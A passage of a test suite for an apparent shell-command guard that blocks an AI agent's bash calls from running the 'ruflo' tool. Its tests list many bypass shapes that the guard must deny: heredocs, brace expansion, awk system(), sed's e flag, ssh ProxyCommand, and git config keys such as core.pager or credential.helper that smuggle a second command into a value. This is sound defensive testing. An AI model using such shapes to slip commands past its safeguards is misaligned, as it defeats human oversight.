// round too — `.find()` picking the first heredoc happens to be the RIGHT
// one there, so it is a control, not a red arm for C3 specifically.
describe('decide() — SMI-6869 governance round C3: two heredocs on one line, bash reads the last one (bypass, regression)', () => {
  it('bash <<A <<B, ruflo in B -> deny (H4, the fix now sees the second heredoc)', () => {
    const command = 'bash <<A <<B\nharmless\nA\nruflo memory store\nB'
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('cat <<A <<B | sh, ruflo in B -> deny (H4, relayed through cat into the pipe, both heredocs joined)', () => {
    const command = 'cat <<A <<B | sh\nharmless\nA\nruflo memory store\nB'
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: bash <<A <<B, ruflo in A (harmless in B) -> deny (already correct pre-C3: .find() picked the right heredoc here)', () => {
    const command = 'bash <<A <<B\nruflo memory store\nA\nharmless\nB'
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

// SMI-6869 governance round C4 (bypass, PRE-EXISTING on both trees — not a
// regression from any earlier SMI-6869 round): `checkBraceSegment` only
// ever fired when the EFFECTIVE FIRST WORD was already a known runner —
// it never considered that a brace ALTERNATION could itself SPELL the
// runner/ruflo name (`{ruflo,} memory store` expands to plain `ruflo`).
// Fixed by scanning every word for a literal comma and checking each
// comma-separated part's basename against H4B_NAMES/RUNNER_BASENAMES,
// BEFORE the runner gate. Controls confirm shell GROUPING (`{ cmd; }`,
// no comma in any word) and ordinary brace expansion with no
// runner/ruflo-shaped part stay allowed.
describe('decide() — SMI-6869 governance round C4: brace alternation spelling the command name (bypass, pre-existing)', () => {
  const redArms = ['{ruflo,} memory store', '{ruflo,x} memory store']
  it.each(redArms)('%s -> deny (brace-syntax)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('brace-syntax')
  })

  const controls = [
    '{ npm run lint; }',
    '{ npm test; npm run lint; }',
    'cp file{,.bak}',
    'mkdir -p dir/{a,b,c}',
  ]
  it.each(controls)(
    'control: %s -> allow (shell grouping or a comma part with no runner/ruflo name)',
    (command) => {
      expect(decide(bashCall(command), {}).action).toBe('allow')
    }
  )

  it('control: npx {ruflo,eslint} memory store -> still denies with brace-syntax in the reason (unaffected by C4)', () => {
    const result = decide(bashCall('npx {ruflo,eslint} memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('brace-syntax')
  })
})

// --- SMI-6854 startDaemon shapes ---

describe('decide() — mcp__ruflo__hooks_session-start startDaemon gate (SMI-6854)', () => {
  const denyShapes: Array<[string, unknown]> = [
    ['true', true],
    ['"true"', 'true'],
    ['1', 1],
    ['[]', []],
    ['{}', {}],
    ['null', null],
  ]
  it.each(denyShapes)('startDaemon=%s -> deny', (_label, value) => {
    const result = decide(sessionStartCall({ startDaemon: value }), {})
    expect(result.action).toBe('deny')
  })

  it('startDaemon absent -> allow', () => {
    expect(decide(sessionStartCall({}), {}).action).toBe('allow')
  })

  it('startDaemon===false -> allow', () => {
    expect(decide(sessionStartCall({ startDaemon: false }), {}).action).toBe('allow')
  })

  it('missing tool_input entirely -> deny (fail-closed rule, round 1 finding 5)', () => {
    const result = decide({ tool_name: 'mcp__ruflo__hooks_session-start' }, {})
    expect(result.action).toBe('deny')
  })
})

// --- SMI-6869 consumer-string family (awk/sed/ssh/git/vim/tmux/screen/
// expect/env-vars/heredoc-consumers) ---
//
// Every label below was MEASURED against this guard's own decide() (via an
// ad-hoc probe script, per CLAUDE.md's "measure, don't reason") before
// being hardcoded here. Most red arms resolve through RECURSION into a
// pre-existing predicate rather than a brand-new label: the new
// `extractConsumerTexts` step (scripts/lib/ruflo-host-guard-consumers.mjs)
// only ever extracts a candidate {text, kind} pair and hands it back to
// `evaluateGuardCommand` — the deny itself almost always comes from H4
// (a bare `ruflo` at argv[0] of the recursed text) or H8-script (the
// shared `INLINE_SCRIPT_BARE_NAME_RE` quoted-text regex, the same one H-8
// already uses for node/python/perl/ruby/php source text).

const R = 'ruflo memory store'

describe('decide() — SMI-6869 consumer-string: awk/gawk system()/pipe-to-sh', () => {
  it('awk system() denies via H8-script (the program text is source, matched by the shared quoted-text regex)', () => {
    const result = decide(bashCall(`awk 'BEGIN{system("${R}")}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('gawk system() denies via H8-script', () => {
    const result = decide(bashCall(`gawk 'BEGIN{system("${R}")}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('awk pipe to "sh" denies via H8-script', () => {
    const result = decide(bashCall(`awk 'BEGIN{print "${R}" | "sh"}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('control: awk -f <file> allows — the program is unreadable (comes from a file), same posture as `source f`', () => {
    expect(decide(bashCall('awk -f prog.awk data.txt'), {}).action).toBe('allow')
  })

  it('control: plain awk with no ruflo reference allows', () => {
    expect(decide(bashCall("awk -F: '{print $2}' /etc/passwd"), {}).action).toBe('allow')
  })

  it('M5: awk -f /dev/stdin fed a heredoc denies via H8-script — the readable-stdin alias is not a real file when a heredoc feeds it', () => {
    const result = decide(bashCall(`awk -f /dev/stdin <<'EOF'\nBEGIN{system("${R}")}\nEOF`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('M5: awk --file=/dev/stdin fed a heredoc denies via H8-script', () => {
    const result = decide(bashCall(`awk --file=/dev/stdin <<'EOF'\nBEGIN{system("${R}")}\nEOF`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it("M5 (process-substitution form): awk -f <(echo ...) denies via H8-script — the substitution's own inner echo producer is resolved the same way `bash <(echo ...)` already resolves one, and its text is closed by the shared quoted-text regex", () => {
    const result = decide(bashCall(`awk -f <(echo 'BEGIN{system("${R}")}') data.txt`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('M5 (process-substitution form): awk --file=<(printf ...) denies via H8-script', () => {
    const result = decide(bashCall(`awk --file=<(printf '%s' 'BEGIN{system("${R}")}')`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('control: awk -f <(echo ...) with an ordinary awk program allows — the resolved producer text is real, but it names no ruflo reference', () => {
    expect(decide(bashCall("awk -f <(echo '{print $1}') data.txt"), {}).action).toBe('allow')
  })

  it('control: awk -f <(a non-literal generator) allows — only echo/printf (or cat-with-a-heredoc) are literal producers this guard can read statically; anything else extracts nothing', () => {
    expect(decide(bashCall('awk -f <(some-generator) data.txt'), {}).action).toBe('allow')
  })

  it('control: bash <(echo ...) still denies via H4 — pre-existing shell-fed process-substitution handling, unaffected by sharing its literal-producer definition with the awk/sed extractors', () => {
    const result = decide(bashCall(`bash <(echo '${R}')`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('m6 (stated limit): a glued -vx=ruflo assignment allows — the awk variable value is opaque to this guard, so system(x) never spells a literal "ruflo" the shared regex can see', () => {
    expect(decide(bashCall(`awk -vx=ruflo 'BEGIN{system(x)}'`), {}).action).toBe('allow')
  })
})

describe('decide() — SMI-6869 consumer-string: sed/gsed e-flag and e-command shell extraction', () => {
  it('sed s///e flag denies via H4 — the replacement text is extracted as real shell text and recursed', () => {
    const result = decide(bashCall(`printf x | sed 's/x/${R}/e'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('sed Ne command form denies via H4', () => {
    const result = decide(bashCall(`sed '1e ${R}' file`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('sed -e "...e" flag denies via H4', () => {
    const result = decide(bashCall(`sed -e 's/x/${R}/e' file`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: sed -n "1,5p" (no e-flag/e-command shape) allows', () => {
    expect(decide(bashCall("sed -n '1,5p' f"), {}).action).toBe('allow')
  })

  it('control: plain sed substitution with no e flag allows', () => {
    expect(decide(bashCall("sed 's/a/b/' file.txt"), {}).action).toBe('allow')
  })

  it('C4: a SECOND e-command in a multi-command script denies via H4 — the extraction regex is now global, not just the first `.exec`', () => {
    const result = decide(bashCall(`sed '1e date;2e ${R}' f`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('M5: sed -f /dev/stdin fed a heredoc script denies via H4 — the body is a sed SCRIPT (same syntax as -e), not a whole program', () => {
    const result = decide(bashCall(`sed -f /dev/stdin f <<'EOF'\ns/x/${R}/e\nEOF`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("M5 (process-substitution form): sed -f <(echo 's///e') denies via H4 — the substitution's own inner echo producer resolves to a sed script, fed through the SAME s///e extraction as -e", () => {
    const result = decide(bashCall(`sed -f <(echo 's/x/${R}/e') f`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — SMI-6869 consumer-string: ssh single-token quoted remote command', () => {
  it('ssh with a single quoted remote command denies via H4', () => {
    const result = decide(bashCall(`ssh localhost '${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('ssh with leading flags then a single quoted remote command denies via H4', () => {
    const result = decide(bashCall(`ssh -p 2222 -i key user@host '${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('an UNQUOTED multi-word remote command denies via H4 — round 2 joins EVERY non-flag argument after the destination, not just a single trailing token', () => {
    const result = decide(bashCall(`ssh localhost ${R}`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('a stray flag-shaped token AFTER the remote command text does not break the join — still denies via H4', () => {
    const result = decide(bashCall(`ssh host '${R}' -v`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("ssh -o ProxyCommand='...' denies via H4 — ssh execs the option's value as a shell command directly", () => {
    const result = decide(bashCall(`ssh -o ProxyCommand='${R}' host`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: ssh host uptime (no ruflo reference) allows', () => {
    expect(decide(bashCall('ssh host uptime'), {}).action).toBe('allow')
  })
})

describe('decide() — SMI-6869 consumer-string: git exec-relevant config keys', () => {
  const execKeyRows: Array<[string, string]> = [
    ['git -c core.pager', `git -c core.pager='${R}' log`],
    ['git -c core.editor', `git -c core.editor='${R}' commit`],
    ['git -c core.sshCommand', `git -c core.sshCommand='${R}' fetch`],
    ['git -c credential.helper (bang-prefixed)', `git -c credential.helper='!${R}' fetch`],
    ['git -c alias.x (GIT_EXEC_KEY_PATTERNS, bang-prefixed)', `git -c alias.x='!${R}' x`],
    ['git config core.pager (SET form)', `git config core.pager '${R}'`],
    ['git config --global core.editor (SET form)', `git config --global core.editor '${R}'`],
    // round 2 (probe-consumers-2.mjs) expansion of GIT_EXEC_KEYS/PATTERNS
    ['git -c core.askpass', `git -c core.askpass='${R}' fetch`],
    ['git -c diff.external', `git -c diff.external='${R}' diff`],
    ['git -c gpg.program', `git -c gpg.program='${R}' commit -S`],
    ['git -c sequence.editor', `git -c sequence.editor='${R}' rebase -i HEAD~2`],
    [
      'git -c credential.<url>.helper (pattern, slashes/colons in the middle segment)',
      `git -c credential.https://x.helper='!${R}' fetch`,
    ],
    ['git -c filter.x.clean', `git -c filter.x.clean='${R}' add .`],
    ['git -c difftool.x.cmd', `git -c difftool.x.cmd='${R}' difftool`],
    ['git -c pager.log', `git -c pager.log='${R}' log`],
    ['git -c core.fsmonitor', `git -c core.fsmonitor='${R}' status`],
    [
      'git config --global alias.x (bang-prefixed, SET form)',
      `git config --global alias.x '!${R}'`,
    ],
    // round-3 governance (M4) expansion of GIT_EXEC_KEYS/PATTERNS
    ['git -c trailer.x.command (deprecated spelling)', `git -c trailer.sign.command='${R}' commit`],
    ['git -c trailer.x.cmd', `git -c trailer.sign.cmd='${R}' commit`],
    ['git -c core.alternateRefsCommand', `git -c core.alternateRefsCommand='${R}' fetch`],
    [
      'git -c submodule.x.update (bang-prefixed only)',
      `git -c submodule.x.update='!${R}' submodule update`,
    ],
    ['git -c diff.x.textconv', `git -c diff.x.textconv='${R}' diff`],
    ['git -c interactive.diffFilter', `git -c interactive.diffFilter='${R}' add -p`],
    ['git -c browser.x.cmd', `git -c browser.x.cmd='${R}' web--browse .`],
    ['git -c web.browser', `git -c web.browser='${R}' help -w`],
    ['git -c man.x.cmd', `git -c man.x.cmd='${R}' help -m add`],
    ['git -c remote.origin.uploadpack', `git -c remote.origin.uploadpack='${R}' fetch`],
    ['git -c remote.origin.receivepack', `git -c remote.origin.receivepack='${R}' push`],
    ['git -c instaweb.httpd', `git -c instaweb.httpd='${R}' instaweb`],
    ['git -c sendemail.smtpServer', `git -c sendemail.smtpServer='${R}' send-email`],
  ]
  it.each(execKeyRows)('%s denies via H4', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: git -c submodule.x.update WITHOUT a bang (a real git keyword like "checkout") allows', () => {
    expect(decide(bashCall('git -c submodule.x.update=checkout submodule update'), {}).action).toBe(
      'allow'
    )
  })

  it('git -c core.pager with an npx form value denies via H5 — the recursion decides, not the key', () => {
    const result = decide(bashCall(`git -c core.pager='npx ${R}' log`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5')
  })

  it('control: git -c core.pager=less (value has no ruflo reference) allows', () => {
    expect(decide(bashCall('git -c core.pager=less log'), {}).action).toBe('allow')
  })

  it('control: git -c core.pager=delta allows — the recursion decides, not the key', () => {
    expect(decide(bashCall('git -c core.pager=delta log'), {}).action).toBe('allow')
  })

  it('control: git -c gpg.program=gpg2 commit -S allows', () => {
    expect(decide(bashCall('git -c gpg.program=gpg2 commit -S'), {}).action).toBe('allow')
  })

  it('control: git -c core.hooksPath=/tmp/hooks status allows — a PATH git reads hook scripts from, not exec text, deliberately left out of GIT_EXEC_KEYS/PATTERNS', () => {
    expect(decide(bashCall('git -c core.hooksPath=/tmp/hooks status'), {}).action).toBe('allow')
  })

  it('control: git -c user.name — NOT an exec-relevant key, so its value is never extracted even though it spells the target text', () => {
    expect(decide(bashCall(`git -c user.name='${R}' log`), {}).action).toBe('allow')
  })

  it('control: plain git log allows', () => {
    expect(decide(bashCall('git log --oneline -5'), {}).action).toBe('allow')
  })
})

// Governance-round M1 fix (post-PR-#2959 retro, new false positive): a
// config VALUE this guard cannot statically resolve (a literal `$` in the
// aligned token, or a non-empty `.subs`) is now SKIPPED by
// `pushGitConfigValue` for the config-key family, the same "out of reach by
// design" posture an unreadable `-f realfile` already carries elsewhere —
// not denied, the different posture `checkUnresolvedCommand`'s own
// `$`-in-head arm uses for an unresolved COMMAND NAME. Before this fix, the
// five real repo lines below (`.husky/pre-commit`'s git-crypt filter
// registration and `scripts/_lib.sh`'s `ensure_git_crypt_filter_registered`)
// all denied, because the extracted `$VAR` value recursed straight into
// that command-head arm one level down.
describe('decide() — SMI-6869 governance round M1: an unresolvable git config VALUE is skipped, not denied (new false positive)', () => {
  const repoShapeRows: Array<[string, string]> = [
    ['pre-commit smudge (no -C)', 'git config --local filter.git-crypt.smudge "$SMUDGE_CMD"'],
    ['pre-commit clean (no -C)', 'git config --local filter.git-crypt.clean "$CLEAN_CMD"'],
    [
      '_lib.sh smudge (with -C)',
      'git -C "$git_context_dir" config --local filter.git-crypt.smudge "$GIT_CRYPT_CANONICAL_SMUDGE"',
    ],
    [
      '_lib.sh clean (with -C)',
      'git -C "$git_context_dir" config --local filter.git-crypt.clean "$GIT_CRYPT_CANONICAL_CLEAN"',
    ],
    [
      '_lib.sh textconv (with -C)',
      'git -C "$git_context_dir" config --local diff.git-crypt.textconv "$GIT_CRYPT_CANONICAL_TEXTCONV"',
    ],
  ]
  it.each(repoShapeRows)('%s allows — the exact repo shape', (_label, cmd) => {
    expect(decide(bashCall(cmd), {}).action).toBe('allow')
  })

  it('git -c core.pager="$X" log allows — an unresolvable config VALUE is out of reach by design, the same posture an unreadable -f realfile already carries elsewhere in this guard, not the different "unresolved command head" posture', () => {
    expect(decide(bashCall('git -c core.pager="$X" log'), {}).action).toBe('allow')
  })

  it("literal control: git -c core.pager='ruflo memory store' log still denies via H4 — a fully resolvable value is unaffected by the fix", () => {
    const result = decide(bashCall(`git -c core.pager='${R}' log`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("literal control: git config --local filter.git-crypt.smudge 'git-crypt smudge' allows — an ordinary literal git-crypt filter value spells no ruflo/claude-flow reference on its own merits", () => {
    expect(
      decide(bashCall("git config --local filter.git-crypt.smudge 'git-crypt smudge'"), {}).action
    ).toBe('allow')
  })
})

// Governance round 8 C1 fix: the skip above tested `token.value` for a `$`
// ANYWHERE, but for `-c` that value is the whole `key=value`, so a value
// whose HEAD spells the name and whose TAIL merely carries a `$` (`ruflo
// $X`) was wrongly read as "unresolvable" and skipped — eleven real rows
// flip from the correct DENY to an incorrect ALLOW under that logic. The
// fix (`hasUnresolvableValueHead`) checks only the value's own command
// HEAD (the first shell word, after an optional `!` alias marker): a `$`
// in a LATER word leaves the head a readable literal that still spells the
// name, and a head that spells the name via a path separator
// (`$HOME/ruflo`) is readable as spelling the name even though it is not
// itself a resolvable filesystem path.
describe('decide() — SMI-6869 governance round 8 C1: a $-in-the-TAIL config value is not skipped when its HEAD still spells the name (regression)', () => {
  const redArms: Array<[string, string, string]> = [
    ['core.pager, head=ruflo tail=$X', 'git -c core.pager="ruflo $X" log', 'H4:'],
    [
      'filter.git-crypt.smudge, head=ruflo tail=$F',
      'git config --local filter.git-crypt.smudge "ruflo smudge $F"',
      'H4:',
    ],
    [
      'core.pager, head=node_modules/.bin/ruflo tail=$X',
      'git -c core.pager="node_modules/.bin/ruflo $X" log',
      'H3:',
    ],
    ['alias bang, head=!ruflo tail=$K', "git -c 'alias.x=!ruflo $K' x", 'H4:'],
    [
      'core.pager, head=$HOME/ruflo (unresolvable AS A PATH, still spells the name)',
      "git -c core.pager='$HOME/ruflo' log",
      'unresolved-command:',
    ],
  ]
  it.each(redArms)('%s denies', (_label, cmd, expectedCode) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(expectedCode)
  })

  // Governance round 11 F3 supersedes both tests below: the skip's premise
  // is "cannot resolve the head AND cannot read the name" — quantified over
  // the WHOLE segment, not just the head. `$SMUDGE_CMD ruflo`/`$X ruflo` put
  // a readable `ruflo` in an ARGUMENT slot behind an unresolvable head, and
  // with the variable unset a real shell still runs `ruflo` there
  // (`sh -c '$X ruflo'` prints nothing but still execs `ruflo`) — text this
  // guard can read, same posture as a name in a later segment. The prior
  // "only the head matters" premise these two tests pinned is retired.
  it('core.pager, head=$SMUDGE_CMD tail=ruflo denies — the readable ARGUMENT-slot name is text this guard can read (round 11 F3 supersedes the prior allow)', () => {
    const result = decide(bashCall('git config --local filter.f.smudge "$SMUDGE_CMD ruflo"'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })

  it('core.pager, head=$X tail=ruflo denies — same shape via -c instead of config --local (round 11 F3 supersedes the prior allow)', () => {
    const result = decide(bashCall('git -c core.pager="$X ruflo" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })
})

// Governance follow-up (PR #2963 cross-family gate, class-1, found inside
// the round-8 C1 fix above): `hasUnresolvableValueHead` treated the value's
// FIRST whitespace word as the command head, but in shell a leading
// `NAME=value` word is an ASSIGNMENT, not the command -- `git -c
// core.pager="X=$Y ruflo memory store" log` and `git config alias.x
// '!X=$Y ruflo status'` were both wrongly skipped (the assignment word
// `X=$Y` carries a `$`) while git's own shell runs `ruflo`; both allowed
// on the pre-fix tree. The mirror-image false positive: `git -c
// core.pager="X=1 $PAGER" log` DENIED unresolved-command, because the
// resolvable-looking assignment head `X=1` was not skipped and the
// recursion then read `$PAGER` as if IT were the command. Fix: skip
// leading `NAME=value` words before testing the head.
describe('decide() — SMI-6869 governance follow-up (PR #2963): a leading NAME=value assignment word is skipped, not read as the command head (regression)', () => {
  const redArms: Array<[string, string, string]> = [
    [
      'core.pager, assignment head X=$Y, then ruflo',
      'git -c core.pager="X=$Y ruflo memory store" log',
      'H4:',
    ],
    [
      'alias bang, assignment head X=$Y, then ruflo',
      "git config alias.x '!X=$Y ruflo status'",
      'H4:',
    ],
  ]
  it.each(redArms)('%s denies', (_label, cmd, expectedCode) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(expectedCode)
  })

  it('core.pager, assignment head X=1, then $PAGER allows — the row that over-denied (unresolved-command) before this fix, because the resolvable assignment head X=1 was not skipped and the recursion then read $PAGER as the command', () => {
    expect(decide(bashCall('git -c core.pager="X=1 $PAGER" log'), {}).action).toBe('allow')
  })

  it('control: core.pager="A=1 B=$X ruflo status" still denies via H4 — already correct before this fix (the OLD unmodified head "A=1" carried no $, so it was already read as resolvable and extracted)', () => {
    const result = decide(bashCall('git -c core.pager="A=1 B=$X ruflo status" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: core.pager="A=1 ruflo status" still denies via H4 — already correct before this fix', () => {
    const result = decide(bashCall('git -c core.pager="A=1 ruflo status" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: core.pager="X=1" allows — an assignment with no command at all (every word is an assignment), same net verdict as before this fix', () => {
    expect(decide(bashCall('git -c core.pager="X=1" log'), {}).action).toBe('allow')
  })

  it('control: core.pager="LESS=-R less" allows — an ordinary non-ruflo assignment-prefixed pager invocation is unaffected', () => {
    expect(decide(bashCall('git -c core.pager="LESS=-R less" log'), {}).action).toBe('allow')
  })
})

// Governance follow-up (same PR #2963 thread, regression the assignment-skip
// fix above introduced): the round above measured `git -c core.pager="X=ruflo
// $PAGER" log` as an honest ALLOW ("no predicate decides against this row")
// -- but that measurement was itself a regression relative to the PRE-skip-
// loop tree, where this exact value denied via H8 (the recursion's own
// H8(i) saw the `X=ruflo` token directly, before the skip loop existed to
// walk past it). The guard's posture at the top level is that an assignment
// whose VALUE is runner-shaped denies (`X=ruflo; $X memory store` denies H8
// on `X=ruflo`), so the config-value skip must not swallow one either. Fix:
// while walking past a leading assignment word, stop and return false (do
// not skip) the moment that word's own value half matches `RUNNER_TOKEN_RE`
// -- the exact regex `checkAssignmentValuePredicate` (H8(i),
// `ruflo-host-guard-predicates.mjs`) already uses, reused rather than
// duplicated. This REPLACES the round-above's now-stale "measured...
// allows" assertion for this exact command.
describe('decide() — SMI-6869 governance follow-up (PR #2963, round 2): a runner-shaped assignment VALUE stops the skip and is extracted, where H8(i) catches it as before (regression)', () => {
  const redArms: Array<[string, string, string]> = [
    [
      'core.pager, assignment value X=ruflo, then $PAGER',
      'git -c core.pager="X=ruflo $PAGER" log',
      'H8:',
    ],
    [
      'alias bang, assignment value X=ruflo, then $PAGER',
      "git config alias.x '!X=ruflo $PAGER'",
      'H8:',
    ],
  ]
  it.each(redArms)('%s denies', (_label, cmd, expectedCode) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(expectedCode)
  })

  it('control: core.pager="X=1 $PAGER" still allows — the round-8 over-deny row this whole thread started from is unaffected: "1" is not runner-shaped, so the skip loop still walks past it to the genuinely unresolvable $PAGER head and skips', () => {
    expect(decide(bashCall('git -c core.pager="X=1 $PAGER" log'), {}).action).toBe('allow')
  })

  it('control: core.pager="X=$Y ruflo memory store" still denies via H4, unchanged — this row was never routed through the assignment-value runner check at all: its assignment word (X=$Y) has an unresolvable VALUE ($Y, not runner-shaped), so the skip loop walks past it on the ordinary path and the post-assignment head "ruflo" is caught by the pre-existing RUFLO_NAME_IN_VALUE_HEAD_RE check', () => {
    const result = decide(bashCall('git -c core.pager="X=$Y ruflo memory store" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: core.pager="LESS=-R less" still allows, unchanged', () => {
    expect(decide(bashCall('git -c core.pager="LESS=-R less" log'), {}).action).toBe('allow')
  })
})

// Governance follow-up (same PR #2963 thread, round 3): the round-2 fix's
// own "measured...allows" test above named a genuine gap and left the
// decision to the coordinator -- RUNNER_TOKEN_RE alone only catches the
// EXACT bare name (`X=ruflo`), not a path whose tail spells it
// (`X=node_modules/.bin/ruflo`, `X=/usr/local/bin/ruflo`, `X=./ruflo`). The
// decision: one rule for the head test and the assignment-value test, not
// two -- a skipped assignment's value is now tested with the SAME predicate
// pair the post-skip HEAD test already uses ("spells the name even with a
// $ in it"): `RUFLO_NAME_IN_VALUE_HEAD_RE` (a bare name or a path whose
// tail is the name) in addition to `RUNNER_TOKEN_RE`. This REPLACES the
// round-2 block's now-stale "measured...allows" assertion for the path-
// shaped row.
describe("decide() — SMI-6869 governance follow-up (PR #2963, round 3): a path-shaped assignment VALUE stops the skip too, matching the head test's own predicate (regression)", () => {
  const redArms: Array<[string, string, string]> = [
    [
      'core.pager, assignment value X=node_modules/.bin/ruflo, then $PAGER',
      'git -c core.pager="X=node_modules/.bin/ruflo $PAGER" log',
      'unresolved-command:',
    ],
    [
      'core.pager, assignment value X=/usr/local/bin/ruflo, then $PAGER',
      'git -c core.pager="X=/usr/local/bin/ruflo $PAGER" log',
      'unresolved-command:',
    ],
    [
      'core.pager, assignment value X=./ruflo, then $PAGER',
      'git -c core.pager="X=./ruflo $PAGER" log',
      'unresolved-command:',
    ],
  ]
  it.each(redArms)(
    '%s denies (label pinned, not asserted as the mechanism that matters)',
    (_label, cmd, expectedCode) => {
      const result = decide(bashCall(cmd), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain(expectedCode)
    }
  )

  it('control: core.pager="X=node_modules/.bin/eslint $PAGER" allows — a path-shaped assignment value that does NOT spell the tool is unaffected', () => {
    expect(
      decide(bashCall('git -c core.pager="X=node_modules/.bin/eslint $PAGER" log'), {}).action
    ).toBe('allow')
  })

  it('control: core.pager="X=/usr/bin/less $PAGER" allows — an ordinary absolute-path assignment value naming an unrelated tool is unaffected', () => {
    expect(decide(bashCall('git -c core.pager="X=/usr/bin/less $PAGER" log'), {}).action).toBe(
      'allow'
    )
  })

  it('control (round-2, unchanged): core.pager="X=1 $PAGER" still allows', () => {
    expect(decide(bashCall('git -c core.pager="X=1 $PAGER" log'), {}).action).toBe('allow')
  })

  it('control (round-2, unchanged): core.pager="X=$Y ruflo memory store" still denies via H4', () => {
    const result = decide(bashCall('git -c core.pager="X=$Y ruflo memory store" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control (round-2, unchanged): core.pager="LESS=-R less" still allows', () => {
    expect(decide(bashCall('git -c core.pager="LESS=-R less" log'), {}).action).toBe('allow')
  })
})

// Governance follow-up (PR #2963 confirmation round, class-2, one last fix
// commit): `hasUnresolvableValueHead` naively whitespace-split the VALUE
// text after the OUTER tokenizer had already stripped the outer `-c`
// quoting, so quoting that survives INSIDE the value itself was invisible
// to the split -- `X="a b" $PAGER` became the bogus words `X="a`, `b"`,
// `$PAGER`: the assignment-skip loop stopped one word early on `b"` as a
// resolvable head, and the recursion denied unresolved-command on the REAL
// trailing `$PAGER`, where the unquoted shape (`X=1 $PAGER`) correctly
// allows. Fix: parse the value with the SAME shared `tokenize()`
// (`shell-command-normalize.mjs`) the outer pipeline already uses, and
// iterate its word tokens' own values for both the assignment-skip loop
// and the head test -- `X="a b"` becomes one word (`X=a b`), matching how
// a real shell reads it.
describe('decide() — SMI-6869 governance follow-up (PR #2963, round 4): the value is parsed with the shared tokenizer, not a naive whitespace split (regression)', () => {
  const redArms: Array<[string, string]> = [
    ['core.pager, single-quoted outer, X="a b" $PAGER', 'git -c core.pager=\'X="a b" $PAGER\' log'],
    ['alias bang, X="a b" $PAGER', 'git config alias.x \'!X="a b" $PAGER\''],
    [
      "core.pager, double-quoted outer, X='a b' \\$PAGER",
      'git -c core.pager="X=\'a b\' \\$PAGER" log',
    ],
  ]
  it.each(redArms)('%s allows', (_label, cmd) => {
    expect(decide(bashCall(cmd), {}).action).toBe('allow')
  })

  it('control: core.pager=\'X="a b" ruflo memory store\' log denies via H4 — the quoted-away portion is harmless, the real trailing command still names the tool', () => {
    const result = decide(bashCall('git -c core.pager=\'X="a b" ruflo memory store\' log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("control: core.pager='X=\"ruflo\" $PAGER' log denies — a quoted assignment value that still exactly names the tool is caught the same as its unquoted round-2 sibling (measured: H8, via the recursion's own pre-strip assignment scan, not forced)", () => {
    const result = decide(bashCall('git -c core.pager=\'X="ruflo" $PAGER\' log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
  })

  it('control (round-2/round-8, unchanged): core.pager="X=1 $PAGER" log still allows', () => {
    expect(decide(bashCall('git -c core.pager="X=1 $PAGER" log'), {}).action).toBe('allow')
  })

  it('control (round-2/round-8, unchanged): core.pager="LESS=-R less" log still allows', () => {
    expect(decide(bashCall('git -c core.pager="LESS=-R less" log'), {}).action).toBe('allow')
  })

  it('control (round-2, unchanged): core.pager="X=ruflo $PAGER" log still denies via H8', () => {
